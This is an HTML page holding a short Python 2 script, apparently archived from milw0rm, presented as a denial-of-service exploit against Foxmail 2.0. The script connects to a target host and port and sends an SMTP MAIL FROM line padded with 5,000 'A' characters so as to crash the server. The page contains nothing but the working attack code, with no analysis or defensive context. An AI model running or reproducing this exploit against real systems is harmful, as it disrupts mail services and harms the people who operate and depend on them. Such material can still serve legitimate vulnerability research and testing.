<html><head><title>Foxmail 2.0 (MAIL FROM:) Denial of Service Exploit</title></head><pre>#!/usr/bin/python
#Code by OYXin
#oyxin_at_segfault.cn
import socket
import sys
import getopt


def usage():
    print &quot;Usage: foxserver.py -h host -p port&quot;
    sys.exit(0)
    
if __name__ == '__main__':
    
    try: 
        opts, args = getopt.getopt(sys.argv[1:], &quot;h:p:&quot;) 
    except getopt.GetoptError, msg: 
        print msg
        usage()
        
    for o,a in opts:
        if o in [&quot;-h&quot;]:
            host = a
        if o in [&quot;-p&quot;]:
            port = int(a)

    evilbuf =  &quot;MAIL-FROM: &lt;&quot; + &quot;A&quot;*5000 + &quot;&gt;&quot; + &quot;\r\n&quot;
    evilbuf += &quot;RCPT-TO: postmaster@company.mailDATA&quot; + &quot;\r\n&quot;
    evilbuf += &quot;Message-ID: 123&quot; + &quot;\r\n&quot;
    evilbuf += &quot;ASDF&quot; + &quot;\r\n&quot;
    evilbuf += &quot;.&quot; + &quot;\r\n&quot;
    evilbuf += &quot;QUIT&quot; + &quot;\r\n&quot;
    try:
        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockfd.connect((host, port))
        recvbuf = sockfd.recv(1024)
        print `recvbuf`
        sockfd.send(&quot;HELO localhost\r\n&quot;)
        recvbuf = sockfd.recv(1024)
        print `recvbuf`
        sockfd.send(evilbuf)
    except socket.error, msg:
        print msg
        
    sockfd.close()

# milw0rm.com [2005-02-07]</pre></html>